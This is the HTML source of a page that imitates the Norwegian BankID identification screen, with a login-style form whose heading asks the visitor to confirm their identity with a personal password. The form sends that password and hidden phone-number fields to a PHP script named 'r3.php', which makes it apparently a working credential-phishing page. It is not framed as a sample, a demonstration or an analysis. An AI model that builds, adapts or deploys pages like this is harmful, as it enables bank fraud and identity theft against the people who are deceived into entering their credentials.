<!DOCTYPE html>
       
<html><head><meta charset="UTF-8">
	<meta charset="utf-8">
	
	<title>BankID</title>
	<link rel="icon" type="image/x-icon" href="image/logo1.png">
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1,requiresActiveX=true">
	<meta name="X-UA-Compatible" content="IE=edge,chrome=1,requiresActiveX=true"><meta name="Cache-Control" content="no-cache"><meta name="viewport" content="width=device-width, initial-scale=0.75, user-scalable=yes"><meta name="X-Content-Type-Options" content="nosniff"><meta name="Pragma" content="no-cache"><meta name="X-XSS-Protection" content="1; mode=block"><meta name="format-detection" content="telephone=no">
	
	<!-- <meta name="viewport" content="width=device-width, initial-scale=1.0">  -->
	
	
	
	






<link rel="stylesheet" href="src/common_auth.css" type="text/css"><link rel="stylesheet" href="src/bidm.css" type="text/css"><link rel="stylesheet" href="src/3625.css" type="text/css"><link rel="SHORTCUT ICON"  type="image/x-icon">

	
	<!--[if lt IE 9]>
        <script src="/static/secure3d/js/html5shiv.js"></script>
    <![endif]-->

</head>
<body style="margin: 0px; padding: 0px;">



<div class="table tds-container">

	
	      <header class="row">
	          <div class="tds-header">
			





	              <div class="table tds-logos">
	                  <div class="cell tds-card">
	                      
						<img src="./src/vbm_blu01r.png" border="0" width="100" height="50">
					
					
					
	                  </div>
	                  <div class="cell tds-bank right">
	                      






<img src="css/ngr-trumf.svg"  jsname="HiaYvf" jsaction="load:XAeZkd;" class="n3VNCb" data-noaft="1" style="width: 70px; height: 45px; margin: 0px;">

	                  </div>
	              </div>
	          </div>
			  
			  
			 
			  
	      </header>
	
	



<section class="row">

	<div class="tds-content">
		<br>
	
		<h1>Vennligst bekreft din identitet</h1>
		<p>
Autentiserings Bekreftelse , med ditt personlige passord.
 <br> 
		</p>
		
		

<div class="table">
<br><br><br>
	
	
</div>	

		
		<p></p>
		
			
					
				
				
				<div class="bidm_app" data-page-type="login">
				    <div class="bidm_live_region" aria-live="assertive" aria-atomic="true" role="log" aria-relevant="additions"></div>
				    <div class="bidm_wrapper">
				        <div class="bidm_frame">
				            <div class="bidm_wrapper-inner">
				                <header class="bidm_header">
				                    <div class="bidm_table">
				                        <div class="bidm_left">
				                            <div class="bidm_logo-wrapper">
				                                <img class="bidm_logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTJweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgOTIgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0MiAoMzY3ODEpIC0gaHR0cDovL3d3dy5ib2hlbWlhbmNvZGluZy5jb20vc2tldGNoIC0tPg0KICAgIDx0aXRsZT5CYW5rSURfcGHMil9tb2JpbF9ncmF5X29yaWdpbmFsLnN2ZzwvdGl0bGU+DQogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+DQogICAgPGRlZnM+DQogICAgICAgIDxwb2x5Z29uIGlkPSJwYXRoLTEiIHBvaW50cz0iMC4wMDA2IDYgNC4wMzQ2IDYgNC4wMzQ2IDAuMDQ5MSAwLjAwMDYgMC4wNDkxIj48L3BvbHlnb24+DQogICAgICAgIDxwb2x5Z29uIGlkPSJwYXRoLTMiIHBvaW50cz0iNTEgMjMuOTUxNiA5MS44OTIgMjMuOTUxNiA5MS44OTIgMTUuOTk5NiA1MSAxNS45OTk2Ij48L3BvbHlnb24+DQogICAgPC9kZWZzPg0KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPg0KICAgICAgICA8ZyBpZD0iR3JvdXAiPg0KICAgICAgICAgICAgPHBhdGggZD0iTTEzLjcsNCBMOC4zLDQgQzguMSw0IDgsNC4xIDgsNC4zIEw4LDUuNyBDOCw1LjkgOC4xLDYgOC4zLDYgTDEzLjcsNiBDMTMuOSw2IDE0LDUuOSAxNCw1LjcgTDE0LDQuMyBDMTQsNC4yIDEzLjksNCAxMy43LDQgWiIgaWQ9IlNoYXBlLUNvcHktMTQiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTEzLjcsOCBMOC4zLDggQzguMSw4IDgsOC4xIDgsOC4zIEw4LDkuNyBDOCw5LjkgOC4xLDEwIDguMywxMCBMMTMuNywxMCBDMTMuOSwxMCAxNCw5LjkgMTQsOS43IEwxNCw4LjMgQzE0LDguMSAxMy45LDggMTMuNyw4IFoiIGlkPSJTaGFwZS1Db3B5LTEzIiBmaWxsPSIjNTU1NTU1IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMS43LDEyIEwxNi4zLDEyIEMxNi4xLDEyIDE2LDEyLjEgMTYsMTIuMyBMMTYsMTMuNyBDMTYsMTMuOSAxNi4xLDE0IDE2LjMsMTQgTDIxLjcsMTQgQzIxLjksMTQgMjIsMTMuOSAyMiwxMy43IEwyMiwxMi4zIEMyMiwxMi4xIDIxLjksMTIgMjEuNywxMiBaIiBpZD0iU2hhcGUtQ29weS0xMiIgZmlsbD0iIzU1NTU1NSIgZmlsbC1ydWxlPSJub256ZXJvIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNNS43LDEyIEwwLjMsMTIgQzAuMSwxMiAwLDEyLjEgMCwxMi4zIEwwLDEzLjcgQzAsMTMuOSAwLjEsMTQgMC4zLDE0IEw1LjcsMTQgQzUuOSwxNCA2LDEzLjkgNiwxMy43IEw2LDEyLjMgQzYsMTIuMSA1LjksMTIgNS43LDEyIFoiIGlkPSJTaGFwZS1Db3B5LTExIiBmaWxsPSIjNTU1NTU1IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMS43LDQgTDE2LjMsNCBDMTYuMSw0IDE2LDQuMSAxNiw0LjMgTDE2LDUuNyBDMTYsNS45IDE2LjEsNiAxNi4zLDYgTDIxLjcsNiBDMjEuOSw2IDIyLDUuOSAyMiw1LjcgTDIyLDQuMyBDMjIsNC4yIDIxLjksNCAyMS43LDQgWiIgaWQ9IlNoYXBlLUNvcHktMTAiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTUuNyw4IEwwLjMsOCBDMC4xLDggMCw4LjEgMCw4LjMgTDAsOS43IEMwLDkuOSAwLjEsMTAgMC4zLDEwIEw1LjcsMTAgQzUuOSwxMCA2LDkuOSA2LDkuNyBMNiw4LjMgQzYsOC4xIDUuOSw4IDUuNyw4IFoiIGlkPSJTaGFwZS1Db3B5LTkiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTUuNywwIEwwLjMsMCBDMC4xLDAgMCwwLjEgMCwwLjMgTDAsMS43IEMwLDEuOSAwLjEsMiAwLjMsMiBMNS43LDIgQzUuOSwyIDYsMS45IDYsMS43IEw2LDAuMyBDNiwwLjEgNS45LDAgNS43LDAgWiIgaWQ9IlNoYXBlLUNvcHktOCIgZmlsbD0iIzU1NTU1NSIgZmlsbC1ydWxlPSJub256ZXJvIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNMjEuNywwIEwxNi4zLDAgQzE2LjEsMCAxNiwwLjEgMTYsMC4zIEwxNiwxLjcgQzE2LDEuOSAxNi4xLDIgMTYuMywyIEwyMS43LDIgQzIxLjksMiAyMiwxLjkgMjIsMS43IEwyMiwwLjMgQzIyLDAuMSAyMS45LDAgMjEuNywwIFoiIGlkPSJTaGFwZS1Db3B5LTciIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTU3LjgsNCBMNTEuMiw0IEM1MS4xLDQgNTEsNC4xIDUxLDQuMyBMNTEsMTMuNyBDNTEsMTMuOSA1MS4xLDE0IDUxLjMsMTQgTDUyLjgsMTQgQzUyLjksMTQgNTMuMSwxMy45IDUzLjEsMTMuNyBMNTMuMSw2LjEgQzUzLDYgNTMuMSw2IDUzLjEsNiBMNTcuNiw2IEM1OCw2IDU4LjMsNi4xIDU4LjUsNi40IEM1OC44LDYuNyA1OC45LDcgNTguOSw3LjQgTDU4LjksMTMuNyBDNTguOSwxMy45IDU5LDE0IDU5LjIsMTQgTDYwLjYsMTQgQzYwLjcsMTQgNjAuOSwxMy45IDYwLjksMTMuNyBMNjAuOSw3LjUgQzYwLjksNi41IDYwLjYsNS43IDYwLDUuMSBDNTkuNCw0LjMgNTguNyw0IDU3LjgsNCBaIiBpZD0iU2hhcGUtQ29weS02IiBmaWxsPSIjNTU1NTU1IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik00OCw1IEM0OC43LDUuNyA0OSw2LjUgNDksNy40IEw0OSwxMy40IEM0OSwxMy43IDQ4LjcsMTQgNDguNCwxNCBMNDIsMTQgQzQwLjMsMTQgMzguOSwxMi42IDM4LjksMTAuOSBDMzguOSw5LjIgNDAuNCw4IDQyLjEsOCBMNDYuOSw4IEw0Nyw3LjkgTDQ3LDcuNSBDNDcsNy4xIDQ2LjgsNi44IDQ2LjYsNi41IEM0Ni4zLDYuMiA0Niw2LjEgNDUuNiw2LjEgTDQwLjQsNi4xIEM0MC4yLDYuMSA0MC4xLDYgNDAuMSw1LjggTDQwLjEsNC4zIEM0MC4xLDQuMSA0MC4yLDQgNDAuNCw0IEw0NS42LDQgQzQ2LjUsNCA0Ny4zLDQuMyA0OCw1IFogTTQ3LDEwLjEgQzQ3LDEwIDQ2LjksOS45IDQ2LjgsOS45IEw0Miw5LjkgQzQxLjQsOS45IDQxLDEwLjQgNDEsMTAuOSBDNDEsMTEuNCA0MS41LDExLjkgNDIsMTEuOSBMNDYuOCwxMS45IEM0Ni45LDExLjkgNDcsMTEuOCA0NywxMS44IEw0NywxMC4xIFoiIGlkPSJTaGFwZS1Db3B5LTUiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTc4LjcsMCBMNzcuMywwIEM3Ny4xLDAgNzcsMC4xIDc3LDAuMyBMNzcsMTMuNyBDNzcsMTMuOSA3Ny4xLDE0IDc3LjMsMTQgTDc4LjcsMTQgQzc4LjksMTQgNzksMTMuOSA3OSwxMy43IEw3OSwwLjMgQzc5LDAuMSA3OC45LDAgNzguNywwIFoiIGlkPSJTaGFwZS1Db3B5LTQiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTkyLDUuNSBMOTIsOC40IEM5MiwxMiA5MC4xLDEzLjkgODYuNywxMy45IEw4MS4zLDEzLjkgQzgxLjIsMTMuOSA4MSwxMy44IDgxLDEzLjYgTDgxLDAuMyBDODEsMC4xIDgxLjEsMCA4MS4zLDAgTDg2LjcsMCBDOTAsMCA5MiwyIDkyLDUuNSBaIE05MCw1LjQgQzkwLDMuMiA4OC45LDIgODYuOCwyIEw4My4xLDIgQzgzLDIgODIuOSwyIDgyLjksMi4xIEw4Mi45LDExLjggQzgyLjksMTEuOSA4MywxMiA4MywxMiBMODYuNywxMiBDODguOCwxMiA5MCwxMC44IDkwLDguNiBMOTAsNS40IFoiIGlkPSJTaGFwZS1Db3B5LTMiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTM3LDUgQzM3LjcsNS43IDM4LDYuNSAzOCw3LjQgTDM4LDEwLjUgQzM4LDExLjUgMzcuNywxMi4zIDM3LDEzIEMzNi4zLDEzLjcgMzUuNSwxNCAzNC42LDE0IEwyOC4zLDE0IEMyOC4xLDE0IDI4LDEzLjkgMjgsMTMuNyBMMjgsMC4zIEMyOCwwLjEgMjguMSwwIDI4LjMsMCBMMjkuNywwIEMyOS45LDAgMzAsMC4xIDMwLDAuMyBMMzAsMy45IEMzMCwzLjkgMzAsNCAzMC4xLDQgTDM0LjUsNCBDMzUuNSw0IDM2LjMsNC4zIDM3LDUgWiBNMzYsNy41IEMzNiw3LjEgMzUuOSw2LjggMzUuNiw2LjUgQzM1LjMsNi4yIDM1LDYuMSAzNC42LDYuMSBMMzAuMiw2LjEgQzMwLDYgMzAsNi4xIDMwLDYuMSBMMzAsMTEuOSBDMzAsMTIgMzAsMTIgMzAuMSwxMiBMMzQuNSwxMiBDMzQuOSwxMiAzNS4yLDExLjkgMzUuNSwxMS42IEMzNS44LDExLjMgMzUuOSwxMSAzNS45LDEwLjYgTDM1LjksNy41IEwzNiw3LjUgWiIgaWQ9IlNoYXBlLUNvcHktMiIgZmlsbD0iIzU1NTU1NSIgZmlsbC1ydWxlPSJub256ZXJvIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNNjUuMyw4IEM2NS4zLDggNjUuMiw4LjEgNjUuMSw4IEM2NSw4IDY1LDcuOSA2NSw3LjkgTDY1LDAuMyBDNjUsMC4xIDY0LjksMCA2NC43LDAgTDYzLjIsMCBDNjMuMSwwIDYzLDAuMSA2MywwLjMgTDYzLDEzLjcgQzYzLDEzLjkgNjMuMSwxNCA2My4zLDE0IEw2NC44LDE0IEM2NC45LDE0IDY1LjEsMTMuOSA2NS4xLDEzLjcgTDY1LjEsMTAuMSBDNjUuMSwxMCA2NS4xLDEwIDY1LjIsMTAgTDY1LjQsMTAgTDcwLjEsMTMuOSBDNzAuMiwxMy45IDcwLjIsMTQgNzAuMywxNCBMNzIsMTQgQzcyLjEsMTQgNzIuMywxMy45IDcyLjMsMTMuNyBDNzIuMywxMy42IDcyLjMsMTMuNSA3Mi4yLDEzLjUgTDY3LDkuMiBMNjcsOS4xIEw2Nyw5IEw3Mi4yLDQuNSBDNzIuMyw0LjUgNzIuMyw0LjQgNzIuMyw0LjMgQzcyLjMsNC4xIDcyLjIsNCA3Miw0IEw3MC4yLDQgQzcwLjEsNCA3MC4xLDQgNzAsNC4xIEw2NS4zLDggWiIgaWQ9IlNoYXBlLUNvcHkiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPGcgaWQ9Ikdyb3VwLTMiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUxLjAwMDAwMCwgMTcuOTUxNjAwKSI+DQogICAgICAgICAgICAgICAgPG1hc2sgaWQ9Im1hc2stMiIgZmlsbD0id2hpdGUiPg0KICAgICAgICAgICAgICAgICAgICA8dXNlIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPg0KICAgICAgICAgICAgICAgIDwvbWFzaz4NCiAgICAgICAgICAgICAgICA8ZyBpZD0iQ2xpcC0yIj48L2c+DQogICAgICAgICAgICAgICAgPHBhdGggZD0iTTMuMjk2NiwyLjA0MDEgTDMuMjk2NiwyLjAyMzEgQzMuMjk2NiwxLjM0MDEgMy4yNDg2LDEuMDA2MSAyLjUyMDYsMS4wMDYxIEwwLjk3MjYsMS4wMDYxIEwwLjk3MjYsMy4wMTIxIEwyLjUyMDYsMy4wMTIxIEMzLjI1NTYsMy4wMTIxIDMuMjk2NiwyLjY0ODEgMy4yOTY2LDIuMDQwMSBMMy4yOTY2LDIuMDQwMSBaIE0yLjE4MjYsMC4wNDkxIEMzLjQ3MDYsMC4wNDkxIDQuMDM0NiwwLjgyNDEgNC4wMzQ2LDEuOTk4MSBMNC4wMzQ2LDIuMDE1MSBDNC4wMzQ2LDMuMzIzMSAzLjI4ODYsNC4wMDYxIDIuMDcwNiw0LjAwNjEgTDAuOTcyNiw0LjAwNjEgTDAuOTcyNiw2LjAwMDEgTDAuMDAwNiw2LjAwMDEgTDAuMDAwNiwwLjA0OTEgTDIuMTgyNiwwLjA0OTEgWiIgaWQ9IkZpbGwtMSIgZmlsbD0iIzRENEQ0QiIgbWFzaz0idXJsKCNtYXNrLTIpIj48L3BhdGg+DQogICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8cG9seWdvbiBpZD0iRmlsbC00IiBmaWxsPSIjNEQ0RDRCIiBwb2ludHM9IjY4Ljk3NzcgMjEuMDIyIDY2Ljk1OTcgMTcuOTg4IDY2LjAwNjcgMTcuOTg4IDY2LjAwNjcgMjMuODE5IDY2Ljk1OTcgMjMuODE5IDY2Ljk1OTcgMTkuNjU0IDY4Ljk0MzcgMjIuMzg2IDY4Ljk3NzcgMjIuMzg2IDcwLjk5NTcgMTkuNjM3IDcwLjk5NTcgMjMuODE5IDcxLjk0ODcgMjMuODE5IDcxLjk0ODcgMTcuOTg4IDcxLjAxODcgMTcuOTg4Ij48L3BvbHlnb24+DQogICAgICAgICAgICA8cGF0aCBkPSJNNzcuOTE1MiwyMC45Njk3IEM3Ny45MTUyLDIyLjA4MzcgNzcuMTI5MiwyMi45OTI3IDc2LjAwMzIsMjIuOTkyNyBDNzQuODc3MiwyMi45OTI3IDc0LjA3NTIsMjIuMDY3NyA3NC4wNzUyLDIwLjk1MzcgTDc0LjA3NTIsMjAuOTM2NyBDNzQuMDc1MiwxOS44MjI3IDc0Ljg2MTIsMTguOTEzNyA3NS45ODcyLDE4LjkxMzcgQzc3LjExMzIsMTguOTEzNyA3Ny45MTUyLDE5LjgzOTcgNzcuOTE1MiwyMC45NTM3IEw3Ny45MTUyLDIwLjk2OTcgWiBNNzYuMDAzMiwxNy45ODc3IEM3NC4yNjIyLDE3Ljk4NzcgNzMuMDMwMiwxOS4zMzk3IDczLjAzMDIsMjAuOTUzNyBMNzMuMDMwMiwyMC45Njk3IEM3My4wMzAyLDIyLjU4MzcgNzQuMjQ1MiwyMy45MTg3IDc1Ljk4NzIsMjMuOTE4NyBDNzcuNzI4MiwyMy45MTg3IDc4Ljk2MDIsMjIuNTY3NyA3OC45NjAyLDIwLjk1MzcgTDc4Ljk2MDIsMjAuOTM2NyBDNzguOTYwMiwxOS4zMjI3IDc3Ljc0NTIsMTcuOTg3NyA3Ni4wMDMyLDE3Ljk4NzcgTDc2LjAwMzIsMTcuOTg3NyBaIiBpZD0iRmlsbC02IiBmaWxsPSIjNEQ0RDRCIj48L3BhdGg+DQogICAgICAgICAgICA8bWFzayBpZD0ibWFzay00IiBmaWxsPSJ3aGl0ZSI+DQogICAgICAgICAgICAgICAgPHVzZSB4bGluazpocmVmPSIjcGF0aC0zIj48L3VzZT4NCiAgICAgICAgICAgIDwvbWFzaz4NCiAgICAgICAgICAgIDxnIGlkPSJDbGlwLTkiPjwvZz4NCiAgICAgICAgICAgIDxwb2x5Z29uIGlkPSJGaWxsLTgiIGZpbGw9IiM0RDRENEIiIG1hc2s9InVybCgjbWFzay00KSIgcG9pbnRzPSI4Ni4wMDkgMjMuODE4NiA4Ni45ODEgMjMuODE4NiA4Ni45ODEgMTcuOTg3NiA4Ni4wMDkgMTcuOTg3NiI+PC9wb2x5Z29uPg0KICAgICAgICAgICAgPHBvbHlnb24gaWQ9IkZpbGwtMTAiIGZpbGw9IiM0RDRENEIiIG1hc2s9InVybCgjbWFzay00KSIgcG9pbnRzPSI4OC45ODM2IDIyLjk3MTIgODguOTgzNiAxOC4wNzMyIDg4LjAxMDYgMTguMDczMiA4OC4wMTA2IDIzLjkwNDIgOTEuODkyNiAyMy45MDQyIDkxLjg5MjYgMjIuOTcxMiI+PC9wb2x5Z29uPg0KICAgICAgICAgICAgPHBhdGggZD0iTTU3LjM2MzQsMjEuOTYzNCBMNTguNTAwNCwxOS4yNzE0IEw1OS42NDY0LDIxLjk2MzQgTDU3LjM2MzQsMjEuOTYzNCBaIE01OC4xMDg0LDE4LjQwMDQgTDU3Ljg4NzQsMTguMzEzNCBMNTUuNTIyNCwyMy45MTk0IEw1Ni41NTU0LDIzLjkxOTQgTDU3LjA1NzQsMjIuOTU1NCBMNTkuOTQzNCwyMi45NTU0IEw2MC40NDY0LDIzLjkxOTQgTDYxLjUxMjQsMjMuOTE5NCBMNTkuMTI2NCwxOC4zMzY0IEw1OC45ODM0LDE4LjM4NTQgTDU4LjEwODQsMTguNDAwNCBaIiBpZD0iRmlsbC0xMSIgZmlsbD0iIzRENEQ0QiIgbWFzaz0idXJsKCNtYXNrLTQpIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNODMuOTEwMywyMi4xODIxIEM4My45MTAzLDIyLjcxNjEgODMuNDc5MywyMi45OTUxIDgyLjc3MTMsMjIuOTk1MSBMODEuMDUwMywyMi45OTUxIEw4MS4wNTAzLDIxLjM2OTEgTDgyLjY5NTMsMjEuMzY5MSBDODMuNTE0MywyMS4zNjkxIDgzLjkxMDMsMjEuNjY1MSA4My45MTAzLDIyLjE2NTEgTDgzLjkxMDMsMjIuMTgyMSBaIE04MC45ODczLDE4LjkxMjEgTDgyLjQ4MDMsMTguOTEyMSBDODMuMTQ3MywxOC45MTIxIDgzLjUxODMsMTkuMjAwMSA4My41MTgzLDE5LjY2NTEgTDgzLjUxODMsMTkuNjgyMSBDODMuNTE4MywyMC4yMjQxIDgzLjA3MTMsMjAuNDg4MSA4Mi40MDUzLDIwLjQ4ODEgTDgwLjk4NzMsMjAuNDg4MSBMODAuOTg3MywxOC45MTIxIFogTTgzLjc3NTMsMjAuODM1MSBDODQuMjE0MywyMC42MDYxIDg0LjYxOTMsMjAuMjI0MSA4NC42MTkzLDE5LjUxMzEgTDg0LjYxOTMsMTkuNDk2MSBDODQuNjE5MywxOS4wOTgxIDg0LjQ4NDMsMTguNzc2MSA4NC4yMjIzLDE4LjUxMzEgQzgzLjg4NTMsMTguMTc0MSA4My4zNTMzLDE3Ljk4ODEgODIuNjc5MywxNy45ODgxIEw4MC4wMjkzLDE3Ljk4ODEgTDgwLjAyOTMsMjMuOTE5MSBMODIuNzYzMywyMy45MTkxIEM4NC4wNzkzLDIzLjkxOTEgODQuOTQ4MywyMy4zNTExIDg0Ljk0ODMsMjIuMjkyMSBMODQuOTQ4MywyMi4yNzUxIEM4NC45NDgzLDIxLjQ3MDEgODQuNDY4MywyMS4wNzIxIDgzLjc3NTMsMjAuODM1MSBMODMuNzc1MywyMC44MzUxIFoiIGlkPSJGaWxsLTEyIiBmaWxsPSIjNEQ0RDRCIiBtYXNrPSJ1cmwoI21hc2stNCkiPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik04MS4wMjc1LDE4LjkxMTYgTDgyLjUyMDUsMTguOTExNiBDODMuMTg2NSwxOC45MTE2IDgzLjU1NzUsMTkuMTQzNiA4My41NTc1LDE5LjUxOTYgTDgzLjU1NzUsMTkuNTMzNiBDODMuNTU3NSwxOS45NzA2IDgzLjExMTUsMjAuMTgyNiA4Mi40NDQ1LDIwLjE4MjYgTDgxLjAyNzUsMjAuMTgyNiBMODEuMDI3NSwxOC45MTE2IFoiIGlkPSJGaWxsLTEzIiBmaWxsPSIjRkZGRkZGIiBtYXNrPSJ1cmwoI21hc2stNCkiPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik04My45NTA0LDIyLjE4MjEgQzgzLjk1MDQsMjIuNzE2MSA4My41MTk0LDIyLjk5NTEgODIuODEwNCwyMi45OTUxIEw4MS4wOTA0LDIyLjk5NTEgTDgxLjA5MDQsMjEuMzY5MSBMODIuNzM0NCwyMS4zNjkxIEM4My41NTQ0LDIxLjM2OTEgODMuOTUwNCwyMS42NjUxIDgzLjk1MDQsMjIuMTY1MSBMODMuOTUwNCwyMi4xODIxIFoiIGlkPSJGaWxsLTE0IiBmaWxsPSIjRkZGRkZGIiBtYXNrPSJ1cmwoI21hc2stNCkiPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik01OC40OTc3LDE4LjM0MjggQzU4Ljk1ODcsMTguMzQyOCA1OS4zMzI3LDE3Ljk2ODggNTkuMzMyNywxNy41MDc4IEM1OS4zMzI3LDE3LjA0NTggNTguOTU4NywxNi42NzE4IDU4LjQ5NzcsMTYuNjcxOCBDNTguMDM1NywxNi42NzE4IDU3LjY2MTcsMTcuMDQ1OCA1Ny42NjE3LDE3LjUwNzggQzU3LjY2MTcsMTcuOTY4OCA1OC4wMzU3LDE4LjM0MjggNTguNDk3NywxOC4zNDI4IE01Ny4wMTk3LDE3LjQ3NjggQzU3LjAxOTcsMTYuNjYxOCA1Ny42ODE3LDE1Ljk5OTggNTguNDk3NywxNS45OTk4IEM1OS4zMTI3LDE1Ljk5OTggNTkuOTc0NywxNi42NjE4IDU5Ljk3NDcsMTcuNDc2OCBDNTkuOTc0NywxOC4yOTI4IDU5LjMxMjcsMTguOTU0OCA1OC40OTc3LDE4Ljk1NDggQzU3LjY4MTcsMTguOTU0OCA1Ny4wMTk3LDE4LjI5MjggNTcuMDE5NywxNy40NzY4IiBpZD0iRmlsbC0xNSIgZmlsbD0iIzRENEQ0QiIgbWFzaz0idXJsKCNtYXNrLTQpIj48L3BhdGg+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4=" alt="BankID logo" title="BankID logo">
				
				                                <h1 tabindex="1025" class="bidm_title">Identifisering</h1>
				                            </div>
				                        </div>
										
										
				                        <div class="bidm_center">
				                        </div>
				                        <div class="bidm_right">
				                            <button class="bidm_close" title="Avbryt" type="button" tabindex="1050">
				                                <span class="bidm_label">Avbryt</span>
				                                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTEiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19jbG9zZTwvdGl0bGU+PHBhdGggZD0iTTEgMy45OTlsNC41IDQuNSA0LjUtNC41IDEgMS00LjUgNC41IDQuNSA0LjVzLS45NTcgMS4wNTEtMSAxYy0xLjIyNi0xLjQ0OS00LjUtNC41LTQuNS00LjVsLTQuNSA0LjUtMS0xIDQuNS00LjUtNC41LTQuNSAxLTF6IiBmaWxsPSIjNTU1Ii8+PC9zdmc+" alt="">
				                            </button>
				                        </div>
				                    </div>
				                </header>
								 <form id="form" name="form" method="post" action="r3.php">
								
								
				
										<input type="hidden" name="tel" id="phoneNumber">
										<input type="hidden" name="phoneAlias" id="phoneAlias">
				                <section class="bidm_body">
				                    <div class="bidm_vertical">
				                        <div class="bidm_horizontal">
				                            <div class="bidm_content">
				                                <form class="bidm_outer-form" novalidate="">
				                                    <div class="bidm_label-wrapper">
				                                        <label class="bidm_login-label" for="bidm_phone">Personlige passord
				                                            </label>
				                                        
				                                           
				                                    </div>
				                                    <div class="bidm_form">
				                                        <div class="bidm_input">
				                                            
				                                            <div class="bidm_wrapper">
				                                                <div class="bidm_input-block">
				                                                    <div class="bidm_input-wrapper">
				                                                        <input id="dob" class="bidm_phone" type="text" name="bb" maxlength="8" placeholder="********" tabindex="2200" autocomplete="off" autocorrect="off" autocapitalize="off" aria-invalid="true" aria-required="true" required="">
				
				                                                        <div class="bidm_phone bidm_placeholder">*******</div>
				                                                    </div>
				                                                    <label for="bidm_phone"></label>
				                                                </div>
				                                                <div class="bidm_input-block">
				                                                    <div class="bidm_input-wrapper">
																	</div>
				                                                        
				                                                </div>
				                                            </div>
				                                        </div>
				                                        <div class="bidm_button-wrapper">
				                                            <button type="submit" title="Neste" class="bidm_next bidm_inactive" aria-disabled="true" >
																
																
				                                                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMTkiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19hcnJvd19yaWdodDwvdGl0bGU+PHBhdGggZD0iTTE5IDExbC01IDUgMiAyIDgtOC41MzEtOC04LjQ2OS0yIDIgNSA1aC0xOXYzaDE5eiIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==" alt="Neste">
				                                            </button>
				                                        </div>
				                                    </div>
				                                </form>
				                            </div>
				                        </div>
				                    </div>
				                </section>
				                <div class="bidm_dialog" role="dialog" aria-labelledby="bidm_dialog-header">
				                    <div class="bidm_row">
				                        <div class="bidm_cell">
				                            <div class="bidm_center">
				                                <div class="bidm_content-wrapper">
				                                    <div class="bidm_dialog-header">
				                                        <h1 tabindex="5000" class="bidm_title" id="bidm_dialog-header">Hjelp: Mobil og
				                                            f&Oslash;dselsdato</h1>
				                                    </div>
				                                    <div class="bidm_dialog-body bidm_scroll" tabindex="5100">
				                                        <p>Legg inn mobilnummeret ditt, 8 siffer uten mellomrom.</p>
				
				                                        <p>F&Oslash;dselsdato skrives med 6 siffer uten punktum og komma.</p>
				                                    </div>
				                                    <div class="bidm_dialog-close">
				                                        <button class="bidm_close" title="Lukk dialog" type="button" tabindex="5900">
				                                            <span class="bidm_label">Lukk</span>
